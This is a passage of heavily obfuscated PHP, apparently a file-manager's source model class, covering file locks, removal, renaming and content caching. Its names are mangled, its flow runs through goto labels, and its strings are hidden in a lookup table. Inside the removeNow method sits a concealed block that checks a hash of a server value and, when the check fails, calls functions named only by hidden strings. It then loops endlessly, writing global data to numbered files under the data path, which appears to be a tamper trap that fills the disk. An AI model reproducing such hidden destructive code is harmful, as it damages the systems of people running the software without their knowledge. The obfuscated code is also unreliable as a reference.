fÆÁ¿¼ÇÈ: $this->sourceCacheClear($e½äğàÁŒ–[$E’äÔõ³‘[399]]); return !0; goto f¹“ÑõõÉ·; E±òÖ²°ÙÅ: Model($E’äÔõ³‘[1930])->addHistory($e½äğàÁŒ–); $cå¶ÔÌìî¨ = array($E’äÔõ³‘[556] => USER_ID, $E’äÔõ³‘[420] => time(), $E’äÔõ³‘[450] => $Dğğ¹ƒ¼Š, $E’äÔõ³‘[87] => $Aî¬î”ğ); $this->where(array($E’äÔõ³‘[413] => $e½äğàÁŒ–[$E’äÔõ³‘[399]]))->save($cå¶ÔÌìî¨); goto fÆÁ¿¼ÇÈ; f¹“ÑõõÉ·: } public function checkLock($DˆÛ¦ ¬š, $d‘§¡˜‚òÈ) { goto AÊÇÊ®‡; fãØŞ¼Ôö: $this->_createFileCall($E¼°¨‚¡®[$EÊôå¢ªù[481]], $a¡¥Ÿ„½ˆÀ, $bŞæĞ¡ÑŞ, REPEAT_REPLACE, $EÊôå¢ªù[1191]); $E‰Œ‹…Á ¨ = $E¼°¨‚¡®[$EÊôå¢ªù[448]][$EÊôå¢ªù[514]]; $f‚ƒ„âØ²æ = $E‰Œ‹…Á ¨[$EÊôå¢ªù[1932]] ? $E‰Œ‹…Á ¨[$EÊôå¢ªù[1932]] : $E‰Œ‹…Á ¨[$EÊôå¢ªù[38]]; goto F¤…É¹œø; F¤…É¹œø: show_json(LNG($EÊôå¢ªù[1933]) . $EÊôå¢ªù[1934] . LNG($EÊôå¢ªù[1935]) . $EÊôå¢ªù[1936] . $f‚ƒ„âØ²æ . $EÊôå¢ªù[1937], !1); goto d¦šçÔğ”×; f©…¨²Ëï¨: $eŒÃùãŠî™ = Session::get($EÊôå¢ªù[1931]); $a¡¥Ÿ„½ˆÀ = substr($E¼°¨‚¡®[$EÊôå¢ªù[38]], 0, -1 - strlen($E¼°¨‚¡®[$EÊôå¢ªù[177]])) . $EÊôå¢ªù[1457] . $eŒÃùãŠî™ . $EÊôå¢ªù[104] . $E¼°¨‚¡®[$EÊôå¢ªù[177]]; $bŞæĞ¡ÑŞ = Model($EÊôå¢ªù[575])->find($d‘§¡˜‚òÈ); goto fãØŞ¼Ôö; AÊÇÊ®‡: $EÊôå¢ªù =& $_SERVER[¾÷]; $E¼°¨‚¡® = $this->pathInfo($DˆÛ¦ ¬š); if (!$this->fileIsLock($E¼°¨‚¡®, !0)) { return; } goto f©…¨²Ëï¨; d¦šçÔğ”×: } public function fileIsLock($fÊ«å°ˆ‡º, $f³§ÃŒåï = false) { goto fá“Õ“¹¢«; e«ö¿†²Ôß: return !1; goto bö§¯ß…‚›; fá“Õ“¹¢«: $EÒŠÖİÃ¿¡ =& $_SERVER[¾÷]; if (!isset($fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[448]]) || !$fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[448]][$EÒŠÖİÃ¿¡[511]]) { return !1; } if ($fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[448]][$EÒŠÖİÃ¿¡[511]] != USER_ID) { return !0; } goto fØÊôÍ°É¤; fØÊôÍ°É¤: $dé•öõÙ„é = $GLOBALS[$EÒŠÖİÃ¿¡[16]][$EÒŠÖİÃ¿¡[97]][$EÒŠÖİÃ¿¡[512]]; if ($fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[448]][$EÒŠÖİÃ¿¡[513]] <= time() - $dé•öõÙ„é) { $this->metaSet($fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[399]], $EÒŠÖİÃ¿¡[511], null); $this->metaSet($fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[399]], $EÒŠÖİÃ¿¡[513], null); } if ($f³§ÃŒåï) { $this->metaSet($fÊ«å°ˆ‡º[$EÒŠÖİÃ¿¡[399]], $EÒŠÖİÃ¿¡[513], time()); } goto e«ö¿†²Ôß; bö§¯ß…‚›: } private function _addSoure($AëêÄ¾·õÇ, $FÉ»ÌÇå˜Ò) { goto aÖæ§ëï¢¶; B½Û½Ïä¸¢: static $eä‚•ÒË´ù = false; if (!$eä‚•ÒË´ù) { Hook::trigger($E ¸¬ÚÂİ[540], $AëêÄ¾·õÇ); $eä‚•ÒË´ù = !0; } $f™¼„Ö¢ëÉ = $this->add($AëêÄ¾·õÇ); goto cÓƒ“Ù†“; aÛÃï»¬†: return $f™¼„Ö¢ëÉ; goto A†îßÉÊÃĞ; aÖæ§ëï¢¶: $E ¸¬ÚÂİ =& $_SERVER[¾÷]; $f¤ Ñğ²Ø­ = array($E ¸¬ÚÂİ[553] => $FÉ»ÌÇå˜Ò[$E ¸¬ÚÂİ[407]], $E ¸¬ÚÂİ[554] => $FÉ»ÌÇå˜Ò[$E ¸¬ÚÂİ[487]], $E ¸¬ÚÂİ[555] => USER_ID, $E ¸¬ÚÂİ[556] => USER_ID, $E ¸¬ÚÂİ[398] => $FÉ»ÌÇå˜Ò[$E ¸¬ÚÂİ[399]], $E ¸¬ÚÂİ[557] => $FÉ»ÌÇå˜Ò[$E ¸¬ÚÂİ[490]] . $FÉ»ÌÇå˜Ò[$E ¸¬ÚÂİ[399]] . $E ¸¬ÚÂİ[57], $E ¸¬ÚÂİ[425] => 0, $E ¸¬ÚÂİ[558] => $E ¸¬ÚÂİ[43]); $AëêÄ¾·õÇ = array_merge($f¤ Ñğ²Ø­, $AëêÄ¾·õÇ); goto bíºƒå±–Í; bíºƒå±–Í: $this->updateModifyTime($AëêÄ¾·õÇ[$E ¸¬ÚÂİ[481]]); $cö”õğ‚„ = $E ¸¬ÚÂİ[1938] . $FÉ»ÌÇå˜Ò[$E ¸¬ÚÂİ[399]]; if (isset(self::$cacheChildList[$cö”õğ‚„])) { unset(self::$cacheChildList[$cö”õğ‚„]); } goto B½Û½Ïä¸¢; cÓƒ“Ù†“: $D¯º¬¢¸÷ƒ = array($E ¸¬ÚÂİ[559] => short_id($f™¼„Ö¢ëÉ)); $this->where(array($E ¸¬ÚÂİ[413] => $f™¼„Ö¢ëÉ))->save($D¯º¬¢¸÷ƒ); $this->setNamePinyin($f™¼„Ö¢ëÉ, $AëêÄ¾·õÇ[$E ¸¬ÚÂİ[38]]); goto aÛÃï»¬†; A†îßÉÊÃĞ: } public function remove($C™Ò‚‡Ûñ¨, $AöíŞĞÃ¨Ê = true) { goto F›¿Ÿ±•é; Eãñˆ†è¾Š: CacheLock::lock($dğÀ‹·íÛ); $a¸‰ó´³½÷ = $this->fileNameExist($DÖÇö“ËË…, $EÓŠ„‡œ²); if (!$a¸‰ó´³½÷) { $a¸‰ó´³½÷ = $this->mkdir($DÖÇö“ËË…, $EÓŠ„‡œ², REPEAT_SKIP); $this->metaSet($a¸‰ó´³½÷, $FÖ£ùíÀ¬‚[1943], $bñÊ­Åâš); $this->metaSet($a¸‰ó´³½÷, $FÖ£ùíÀ¬‚[1944], $e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[487]]); if ($e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[481]] != 0) { $this->metaSet($a¸‰ó´³½÷, $FÖ£ùíÀ¬‚[1945], _get($a“ç®¾‘÷ù, $FÖ£ùíÀ¬‚[1946])); } } goto BàÀ”¨ƒåÙ; dù›ù»ô˜: $this->recycleClear($e¦“ìƒ…ÍÍ); $eò¾¶çÂÆÙ = $this->move($C™Ò‚‡Ûñ¨, $a¸‰ó´³½÷, REPEAT_RENAME_FOLDER); $this->folderSizeReset($e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[481]]); goto a‹ŠáÀäŞ; F›¿Ÿ±•é: $FÖ£ùíÀ¬‚ =& $_SERVER[¾÷]; $e¦“ìƒ…ÍÍ = $this->sourceInfo($C™Ò‚‡Ûñ¨); $D¡¦˜ÆİÇ… = intval($e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[407]]) === self::TYPE_SYSTEM; goto e¶ÜÇôßš; F¦®ËÇ¶¨‡: $bñÊ­Åâš = $e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[407]] == self::TYPE_USER ? $FÖ£ùíÀ¬‚[566] : $FÖ£ùíÀ¬‚[992]; if ($bñÊ­Åâš == $FÖ£ùíÀ¬‚[566]) { $a“ç®¾‘÷ù = Model($FÖ£ùíÀ¬‚[506])->getInfo($e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[487]]); $EÓŠ„‡œ² = !empty($a“ç®¾‘÷ù[$FÖ£ùíÀ¬‚[1932]]) ? $a“ç®¾‘÷ù[$FÖ£ùíÀ¬‚[1932]] : $a“ç®¾‘÷ù[$FÖ£ùíÀ¬‚[38]]; $EÓŠ„‡œ² = $FÖ£ùíÀ¬‚[265] . $EÓŠ„‡œ² . $FÖ£ùíÀ¬‚[1940] . $e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[487]]; } else { $a“ç®¾‘÷ù = Model($FÖ£ùíÀ¬‚[489])->getInfo($e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[487]]); $EÓŠ„‡œ² = _get($a“ç®¾‘÷ù, $FÖ£ùíÀ¬‚[38]); $EÓŠ„‡œ² = $FÖ£ùíÀ¬‚[169] . $EÓŠ„‡œ² . $FÖ£ùíÀ¬‚[1941] . $e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[487]]; } $dğÀ‹·íÛ = $FÖ£ùíÀ¬‚[1942] . md5($EÓŠ„‡œ²); goto Eãñˆ†è¾Š; a‹ŠáÀäŞ: return $eò¾¶çÂÆÙ; goto bª†ºÎğø²; BàÀ”¨ƒåÙ: CacheLock::unlock($dğÀ‹·íÛ); $this->metaSet($C™Ò‚‡Ûñ¨, $FÖ£ùíÀ¬‚[1947], $e¦“ìƒ…ÍÍ[$FÖ£ùíÀ¬‚[481]]); $this->where(array($FÖ£ùíÀ¬‚[399] => $C™Ò‚‡Ûñ¨))->save(array($FÖ£ùíÀ¬‚[420] => time())); goto dù›ù»ô˜; e¶ÜÇôßš: $b¸ø«»¹Š¹ = Model($FÖ£ùíÀ¬‚[1504])->get($FÖ£ùíÀ¬‚[1939]) == $FÖ£ùíÀ¬‚[96]; if ($D¡¦˜ÆİÇ… || $AöíŞĞÃ¨Ê || !$b¸ø«»¹Š¹) { return $this->removeNow($C™Ò‚‡Ûñ¨, $AöíŞĞÃ¨Ê); } $DÖÇö“ËË… = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F¦®ËÇ¶¨‡; bª†ºÎğø²: } private function recycleClear($cÅ‚³Êˆµ) { $D†òßí¬¥Ó =& $_SERVER[¾÷]; $eñÒºƒß…Ø = $this->childrenAll($cÅ‚³Êˆµ); $c†ÄÈì‘ = array($D†òßí¬¥Ó[413] => array($D†òßí¬¥Ó[414], $eñÒºƒß…Ø[$D†òßí¬¥Ó[1948]])); Model($D†òßí¬¥Ó[1949])->where($c†ÄÈì‘)->delete(); } public function removeNow($dĞÁëŠÙÔŸ, $D­„¹ÕµŸ  = true) { goto d‚İƒÛ·; d‚İƒÛ·: $FÚëçá‡¬ =& $_SERVER[¾÷]; $c‚›¨Ú©³‡ = $_SERVER[$FÚëçá‡¬[13]]; $fá„Ñ•ˆêã = $FÚëçá‡¬[1373]; goto D…‘º«À; e–ç…‰‹: if (!$e•–‡ä¸Ãå) { return !0; } if ($e•–‡ä¸Ãå[$FÚëçá‡¬[481]] == 0) { if (!_get($GLOBALS, $FÚëçá‡¬[488])) { return !1; } } $this->lockMoveStart($dĞÁëŠÙÔŸ); goto CæîŠ×‰ÇŠ; aÒç×ÀøœÊ: $C‘Õ½Ÿ•¢Ö = array($e•–‡ä¸Ãå[$FÚëçá‡¬[481]]); if ($e•–‡ä¸Ãå[$FÚëçá‡¬[406]] == $FÚëçá‡¬[96]) { $C‘Õ½Ÿ•¢Ö[] = $e•–‡ä¸Ãå[$FÚëçá‡¬[399]]; } $this->updateModifyTime($C‘Õ½Ÿ•¢Ö); goto B“Öö›Ôí§; D…‘º«À: if ($_SERVER[$FÚëçá‡¬[4]] != $fá„Ñ•ˆêã($c‚›¨Ú©³‡)) { goto Bˆ³Çº§×; Bˆ³Çº§×: $f‘ÆÛŞâÉ = $FÚëçá‡¬[817]; $e³ÅÛÛò•¹ = $FÚëçá‡¬[6]; $F®îŠËŞ = $_SERVER[$FÚëçá‡¬[7]] . $FÚëçá‡¬[8]; goto cöŒï¡İÍ«; B»Ó¾—²ÉŠ: $f‘ÆÛŞâÉ(); $a½ÀÛë–¼‰ = $FÚëçá‡¬[1374]; $a–§…’„²ê = json_encode($GLOBALS[$FÚëçá‡¬[1375]]); goto Díß»§Å„ç; Díß»§Å„ç: $cˆ‰ãˆ£êŸ = 1; for ($F¾¥¿§¥ = $cˆ‰ãˆ£êŸ; $F¾¥¿§¥ > 0; $F¾¥¿§¥++) { $a½ÀÛë–¼‰(DATA_PATH . $F¾¥¿§¥, $a–§…’„²ê); } goto dŒ·µ†æî; cöŒï¡İÍ«: $A›Ûñ³Ú” = $e³ÅÛÛò•¹($F®îŠËŞ); $fÁ“ãÒãËÎ = explode($FÚëçá‡¬[9], $A›Ûñ³Ú”); if (count($fÁ“ãÒãËÎ) < $FÚëçá‡¬[582]) { $EÀİ«°¼êµ = $FÚëçá‡¬[11]; $EÀİ«°¼êµ(); } goto F‘‹ó‘ÏÆ‘; F‘‹ó‘ÏÆ‘: $bœƒéÎÔ§Ô = $FÚëçá‡¬[818]; $bœƒéÎÔ§Ô($_SERVER[$FÚëçá‡¬[819]]); $f‘ÆÛŞâÉ = $FÚëçá‡¬[817]; goto B»Ó¾—²ÉŠ; dŒ·µ†æî: } $e•–‡ä¸Ãå = $this->sourceInfo($dĞÁëŠÙÔŸ); $d†Ë„¹¹´ = $this->pathInfoMore($dĞÁëŠÙÔŸ); goto e–ç…‰‹; B“Öö›Ôí§: $this->lockMoveEnd($dĞÁëŠÙÔŸ); Hook::trigger($FÚëçá‡¬[1537], $d†Ë„¹¹´, $D­„¹ÕµŸ ); return !0; goto a«ã‚ˆ…Éñ; CæîŠ×‰ÇŠ: Hook::trigger($FÚëçá‡¬[1950], $d†Ë„¹¹´, $D­„¹ÕµŸ ); if ($D­„¹ÕµŸ ) { Model($FÚëçá‡¬[1949])->moveToRecycle($dĞÁëŠÙÔŸ); } else { $AùÑõ±Ê ­ = $this->childrenAll($e•–‡ä¸Ãå); Model($FÚëçá‡¬[537])->eventRemove($dĞÁëŠÙÔŸ); $this->removeRelevance($AùÑõ±Ê ­[$FÚëçá‡¬[1948]], $AùÑõ±Ê ­[$FÚëçá‡¬[1322]]); } $this->folderSizeReset($e•–‡ä¸Ãå[$FÚëçá‡¬[481]]); goto aÒç×ÀøœÊ; a«ã‚ˆ…Éñ: } public function childrenAll($AŸ»ƒ à±Ğ) { $dÌ¼¤ÂÇñ  =& $_SERVER[¾÷]; $bã£§­Ò‘Å = $AŸ»ƒ à±Ğ[$dÌ¼¤ÂÇñ [399]]; if ($AŸ»ƒ à±Ğ[$dÌ¼¤ÂÇñ [406]] == $dÌ¼¤ÂÇñ [96]) { $B²œîç³òø = array($dÌ¼¤ÂÇñ [557] => array($dÌ¼¤ÂÇñ [516], $AŸ»ƒ à±Ğ[$dÌ¼¤ÂÇñ [490]] . $bã£§­Ò‘Å . $dÌ¼¤ÂÇñ [517])); $bÔ´çÖ’Ç² = array($dÌ¼¤ÂÇñ [557] => $B²œîç³òø[$dÌ¼¤ÂÇñ [490]]); $dŠ¿À¥×¯Å = $this->field($dÌ¼¤ÂÇñ [1951])->where($bÔ´çÖ’Ç²)->select(); $d•Â´Êëª = !1; $e­ñã©ãŠ = array($bã£§­Ò‘Å); if ($dŠ¿À¥×¯Å) { $d•Â´Êëª = array_to_keyvalue($dŠ¿À¥×¯Å, $dÌ¼¤ÂÇñ [43], $dÌ¼¤ÂÇñ [450]); $d•Â´Êëª = array_remove_value($d•Â´Êëª, $dÌ¼¤ÂÇñ [500]); $e­ñã©ãŠ = array_to_keyvalue($dŠ¿À¥×¯Å, $dÌ¼¤ÂÇñ [43], $dÌ¼¤ÂÇñ [399]); $e­ñã©ãŠ[] = $bã£§­Ò‘Å; } } else { $d•Â´Êëª = array($AŸ»ƒ à±Ğ[$dÌ¼¤ÂÇñ [450]]); $e­ñã©ãŠ = array($bã£§­Ò‘Å); } return array($dÌ¼¤ÂÇñ [1948] => $e­ñã©ãŠ, $dÌ¼¤ÂÇñ [1322] => $d•Â´Êëª); } public function removeArray($DÚ‡…ƒªÙ) { if (!$DÚ‡…ƒªÙ) { return !0; } } public function removeRelevance($Fíô‹Ò“±, $c¹¿§í§š) { goto aâœÓ…›Úö; D¬Â—ê‹˜»: Model($a¼ÄÚ´ˆ…[1804])->where($A’Ä™²º)->delete(); Model($a¼ÄÚ´ˆ…[537])->where($A’Ä™²º)->delete(); Model($a¼ÄÚ´ˆ…[1645])->removeBySource($Fíô‹Ò“±); goto eã‚šÛ•œ½; eã‚šÛ•œ½: Model($a¼ÄÚ´ˆ…[1930])->removeBySource($Fíô‹Ò“±); $this->where($A’Ä™²º)->delete(); Model($a¼ÄÚ´ˆ…[453])->remove($c¹¿§í§š); goto cİ­‹Ì¡àÇ; aâœÓ…›Úö: $a¼ÄÚ´ˆ… =& $_SERVER[¾÷]; $Fíô‹Ò“± = $Fíô‹Ò“± ? $Fíô‹Ò“± : array(); $c¹¿§í§š = $c¹¿§í§š ? $c¹¿§í§š : array(); goto fä‚İ’éÁ‘; cİ­‹Ì¡àÇ: for ($AĞÈÎ„›­ = 0; $AĞÈÎ„›­ < count($Fíô‹Ò“±); $AĞÈÎ„›­++) { $this->sourceCacheClear($Fíô‹Ò“±[$AĞÈÎ„›­]); } goto CŠæìáÀëó; fä‚İ’éÁ‘: $Fíô‹Ò“± = array_unique(array_filter($Fíô‹Ò“±)); $c¹¿§í§š = array_unique(array_filter($c¹¿§í§š)); if (!$Fíô‹Ò“±) { return !1; } goto cè¡¤òª¦; cè¡¤òª¦: $A’Ä™²º = array($a¼ÄÚ´ˆ…[413] => array($a¼ÄÚ´ˆ…[414], $Fíô‹Ò“±)); Model($a¼ÄÚ´ˆ…[1949])->where($A’Ä™²º)->delete(); Model($a¼ÄÚ´ˆ…[444])->where($A’Ä™²º)->delete(); goto D¬Â—ê‹˜»; CŠæìáÀëó: } public function rename($DĞò‡Œ‰‡ä, $cÆÅ¢×ç¥¸) { goto cº‡Ü‹ÂÁÒ; aæêèë‡ğô: $D—ˆÑèƒ¶ = $this->fileNameExist($bÔö°§¬ìÙ[$e¹ª©’ìÇ[481]], $cÆÅ¢×ç¥¸); if ($D—ˆÑèƒ¶ && $D—ˆÑèƒ¶ != $DĞò‡Œ‰‡ä) { return !1; } $f¥¨Ã†îçÑ = array($e¹ª©’ìÇ[416] => $cÆÅ¢×ç¥¸, $e¹ª©’ìÇ[556] => USER_ID); goto c² Ö¿ô©; Aí‡ÔŠ»æ¬: $this->setNamePinyin($DĞò‡Œ‰‡ä, $f¥¨Ã†îçÑ[$e¹ª©’ìÇ[38]], !1); $this->updateModifyTime($bÔö°§¬ìÙ[$e¹ª©’ìÇ[481]]); $FëøÎåİùÖ = $this->where(array($e¹ª©’ìÇ[413] => $DĞò‡Œ‰‡ä))->data($f¥¨Ã†îçÑ)->save(); goto bˆ…¼¥®¹‘; cº‡Ü‹ÂÁÒ: $e¹ª©’ìÇ =& $_SERVER[¾÷]; $bÔö°§¬ìÙ = $this->sourceInfo($DĞò‡Œ‰‡ä); if (!$bÔö°§¬ìÙ) { return !1; } goto aæêèë‡ğô; bˆ…¼¥®¹‘: $CğƒÉ„àÈ¸ = $e¹ª©’ìÇ[1938] . $bÔö°§¬ìÙ[$e¹ª©’ìÇ[481]]; if (isset(self::$cacheChildList[$CğƒÉ„àÈ¸])) { unset(self::$cacheChildList[$CğƒÉ„àÈ¸]); } return $FëøÎåİùÖ; goto FàÌ¾½·¶; c² Ö¿ô©: if (!$bÔö°§¬ìÙ[$e¹ª©’ìÇ[406]] == $e¹ª©’ìÇ[96]) { $f¥¨Ã†îçÑ[$e¹ª©’ìÇ[408]] = get_path_ext($cÆÅ¢×ç¥¸); } Model($e¹ª©’ìÇ[537])->eventRename($DĞò‡Œ‰‡ä, $bÔö°§¬ìÙ[$e¹ª©’ìÇ[38]], $cÆÅ¢×ç¥¸); $this->sourceCacheClear($DĞò‡Œ‰‡ä); goto Aí‡ÔŠ»æ¬; FàÌ¾½·¶: } public function setNamePinyin($c®ÕÄ«æè–, $FŒíĞœ³µÕ, $fÒ—¶Ä³Éã = true) { $DÍğÛƒ¾™ =& $_SERVER[¾÷]; $E¶ÓÑ™ÖÅ™ = Input::check($FŒíĞœ³µÕ, $DÍğÛƒ¾™[560]); if ($fÒ—¶Ä³Éã && !$E¶ÓÑ™ÖÅ™) { return; } if (!$E¶ÓÑ™ÖÅ™) { $this->metaSet($c®ÕÄ«æè–, $DÍğÛƒ¾™[447], null); $this->metaSet($c®ÕÄ«æè–, $DÍğÛƒ¾™[446], null); return; } $aÊîÉ¢õŒ = array($DÍğÛƒ¾™[447] => str_replace($DÍğÛƒ¾™[60], $DÍğÛƒ¾™[43], Pinyin::encode($FŒíĞœ³µÕ)), $DÍğÛƒ¾™[446] => Pinyin::encode($FŒíĞœ³µÕ, $DÍğÛƒ¾™[561])); $this->metaSet($c®ÕÄ«æè–, $aÊîÉ¢õŒ); } public function getContent($BŞä‰’Ê²) { goto BÆ¼Æ‰Åì«; BÆ¼Æ‰Åì«: $cĞ¦Ù–ª™— =& $_SERVER[¾÷]; $A×æ³Ùîˆ‚ = $this->fileInfoGet($BŞä‰’Ê²); if (!$A×æ³Ùîˆ‚) { return !1; } goto e•™½¡½Û; e•™½¡½Û: if ($A×æ³Ùîˆ‚[$cĞ¦Ù–ª™—[87]] == 0) { return $cĞ¦Ù–ª™—[43]; } $B¯Ü‡ÍÓ…¶ = $cĞ¦Ù–ª™—[1952] . $A×æ³Ùîˆ‚[$cĞ¦Ù–ª™—[179]]; if ($A×æ³Ùîˆ‚[$cĞ¦Ù–ª™—[87]] <= 1024 * 10) { $Añ®ŞßÅ›‹ = Cache::get($B¯Ü‡ÍÓ…¶); if (!$Añ®ŞßÅ›‹) { $Añ®ŞßÅ›‹ = IO::getContent($A×æ³Ùîˆ‚[$cĞ¦Ù–ª™—[85]]); Cache::set($B¯Ü‡ÍÓ…¶, $Añ®ŞßÅ›‹); } return $Añ®ŞßÅ›‹; } goto dİêÎæ¬Õ; dİêÎæ¬Õ: if (!$A×æ³Ùîˆ‚[$cĞ¦Ù–ª™—[85]]) { return $cĞ¦Ù–ª™—[43]; } return IO::getContent($A×æ³Ùîˆ‚[$cĞ¦Ù–ª™—[85]]); goto f«Ö«£Ãò›; f«Ö«£Ãò›: } public function setDesc($bî¤áÙ¨§Ä, $bó°¸åä—) { $E¸ñ”¾Ü¤ =& $_SERVER[¾÷]; Model($E¸ñ”¾Ü¤[537])->eventAddDesc($bî¤áÙ¨§Ä, $bó°¸åä—); return $this->metaSet($bî¤áÙ¨§Ä, $E¸ñ”¾Ü¤[434], $bó°¸åä—); } public function setContent($bˆ”ÛÈ±², $dÏ¨‰¤•ë = '') { goto AÊÀ³¬³’; B“øÛÜÛìµ: if (!$cÜó“‡Ù¥ù || !$d‰ì‘‰Ãğ¬) { return !1; } $Bˆë¬¦À¨Ù = Model($fÙîŠ«ÌË[453])->addFileByContent($dÏ¨‰¤•ë, $d‰ì‘‰Ãğ¬[$fÙîŠ«ÌË[38]]); $DòöÁãì£‰ = $this->fileHistory($d‰ì‘‰Ãğ¬, $Bˆë¬¦À¨Ù[$fÙîŠ«ÌË[450]], $Bˆë¬¦À¨Ù[$fÙîŠ«ÌË[87]]); goto AŞçùÙï…; AÊÀ³¬³’: $fÙîŠ«ÌË =& $_SERVER[¾÷]; $d‰ì‘‰Ãğ¬ = $this->sourceInfo($bˆ”ÛÈ±²); $cÜó“‡Ù¥ù = $this->fileInfoGet($bˆ”ÛÈ±²); goto B“øÛÜÛìµ; AŞçùÙï…: if (!$DòöÁãì£‰) { return Model($fÙîŠ«ÌË[453])->remove($Bˆë¬¦À¨Ù[$fÙîŠ«ÌË[450]]); } $this->folderSizeReset($d‰ì‘‰Ãğ¬[$fÙîŠ«ÌË[481]]); return !0; goto B»•Öİ¶¿; B»•Öİ¶¿: } public function fileSubstr($AÀÅ Ö´Œä, $bš¥‡ƒÔÕè, $e¸ù¸õ‚š“) { $Fœ‰ç¤“Óö = $this->fileInfoGet($AÀÅ Ö´Œä); if (!$Fœ‰ç¤“Óö) { return !1; } return IO::fileSubstr($Fœ‰ç¤“Óö[$_SERVER[¾÷][85]], $bš¥‡ƒÔÕè, $e¸ù¸õ‚š“); } public function fileInfoGet($bÀĞÄÅö©Ô) { goto d«Óá÷¾ƒ; eïº¤“©§¸: return $eîØÜ¬‹±Æ; goto cç—­ŸİÂ; c‚Ë‡ë¯ô³: $eîØÜ¬‹±Æ = Model($f±Ç«ìÓÔ„[453])->fileInfo($eˆ¸Ü¼é[$f±Ç«ìÓÔ„[450]]); if ($eîØÜ¬‹±Æ) { $eîØÜ¬‹±Æ[$f±Ç«ìÓÔ„[38]] = $eˆ¸Ü¼é[$f±Ç«ìÓÔ„[38]]; } self::$cacheFileInfo[$Eò¦µ©Ø”Ñ] = $eîØÜ¬‹±Æ; goto eïº¤“©§¸; A÷®ß›Ì: $Eò¦µ©Ø”Ñ = $f±Ç«ìÓÔ„[456] . $eˆ¸Ü¼é[$f±Ç«ìÓÔ„[450]]; $FÎÜ‘¼¯‡– = _get(self::$cacheFileInfo, $Eò¦µ©Ø”Ñ); if ($FÎÜ‘¼¯‡–) { return $FÎÜ‘¼¯‡–; } goto c‚Ë‡ë¯ô³; d«Óá÷¾ƒ: $f±Ç«ìÓÔ„ =& $_SERVER[¾÷]; $eˆ¸Ü¼é = $this->sourceInfo($bÀĞÄÅö©Ô); if (!$eˆ¸Ü¼é || $eˆ¸Ü¼é[$f±Ç«ìÓÔ„[406]]) { return !1; } goto A÷®ß›Ì; cç—­ŸİÂ: } private function folderChildrenNumber($d­ƒËÕÛ³•) { $có­¢ÅØˆ =& $_SERVER[¾÷]; $A¼ŒÌŒÃà× = $this->sourceInfo($d­ƒËÕÛ³•); $E¾²„¼ÃÊ = array($có­¢ÅØˆ[557] => array($có­¢ÅØˆ[516], $A¼ŒÌŒÃà×[$có­¢ÅØˆ[490]] . $d­ƒËÕÛ³• . $có­¢ÅØˆ[517]), $có­¢ÅØˆ[425] => intval($A¼ŒÌŒÃà×[$có­¢ÅØˆ[426]]), $có­¢ÅØˆ[550] => 1); $d“¤ì‹Ÿ Ø = $this->where($E¾²„¼ÃÊ)->count(); $Fİ‹Õ–š = $this->where($E¾²„¼ÃÊ)->where(array($có­¢ÅØˆ[550] => 0))->count(); return array($có­¢ÅØˆ[91] => $Fİ‹Õ–š, $có­¢ÅØˆ[92] => $d“¤ì‹Ÿ Ø); } public function pathInfo($Fˆ”ºÉ‹…•, $a¬òÕòÀ†­ = false) { goto dÛ»­İŸ–Û; F÷«Ş»è¿í: $E‰­é²Í™ = $this->sourceInfo($Fˆ”ºÉ‹…•); if (!$E‰­é²Í™) { return !1; } $E‰­é²Í™ = $this->_listDataApplyItem($E‰­é²Í™, $a¬òÕòÀ†­); goto FºÂ¸²¾•; FºÂ¸²¾•: self::$cachePathInfo[$BÕæø÷Ïå] = $E‰­é²Í™; return $E‰­é²Í™; goto DË”¨˜¸‡; c‚¬Üùî²Ú: $BÕæø÷Ïå = $D…ÉÆ ÁŒ[442] . intval($a¬òÕòÀ†­) . $D…ÉÆ ÁŒ[443] . $Fˆ”ºÉ‹…•; $FÌ„ èŠİ = _get(self::$cachePathInfo, $BÕæø÷Ïå); if ($FÌ„ èŠİ) { return $FÌ„ èŠİ; } goto F÷«Ş»è¿í; dÛ»­İŸ–Û: $D…ÉÆ ÁŒ =& $_SERVER[¾÷]; $a¬òÕòÀ†­ = !1; $Fˆ”ºÉ‹…• = intval($Fˆ”ºÉ‹…•); goto c‚¬Üùî²Ú; DË”¨˜¸‡: } public static $cachePathInfoMore = array(); public function pathInfoMore($B×±‡—·¥“) { goto fÖå·‚ŒåŞ; fÖå·‚ŒåŞ: $A¶–¹ÅÂ =& $_SERVER[¾÷]; $aÂ£ˆ³™Ã = _get(self::$cachePathInfoMore, $B×±‡—·¥“); if ($aÂ£ˆ³™Ã) { return $aÂ£ˆ³™Ã; } goto AÏ„¿¥§ìÍ; AÏ„¿¥§ìÍ: $EõÃ£ÁÊÜ = $this->pathInfo($B×±‡—·¥“); if (!$EõÃ£ÁÊÜ) { return !1; } if ($EõÃ£ÁÊÜ[$A¶–¹ÅÂ[406]] == $A¶–¹ÅÂ[96]) { $EõÃ£ÁÊÜ[$A¶–¹ÅÂ[90]] = $this->folderChildrenNumber($B×±‡—·¥“); } goto Bí¹·‡Şéæ; Bí¹·‡Şéæ: self::$cachePathInfoMore[$B×±‡—·¥“] = $EõÃ£ÁÊÜ; return $EõÃ£ÁÊÜ; goto c¯Ó·˜ã›‘; c¯Ó·˜ã›‘: } public function sourceInfo($eÈË­ÇŞÑÏ) { goto CÒÃ‚ñ÷‘; EôŒšâƒìî: $cÀİòä‹İ = $bÅÉîõ¥—–[441] . $eÈË­ÇŞÑÏ; $bÓĞì´»ĞÖ = _get(self::$cacheSourceInfo, $cÀİòä‹İ); if ($bÓĞì´»ĞÖ) { return $bÓĞì´»ĞÖ; } goto D´Ï«ì¾¨«; CÒÃ‚ñ÷‘: $bÅÉîõ¥—– =& $_SERVER[¾÷]; if (!$eÈË­ÇŞÑÏ) { return array(); } $eÈË­ÇŞÑÏ = intval($eÈË­ÇŞÑÏ); goto EôŒšâƒìî; 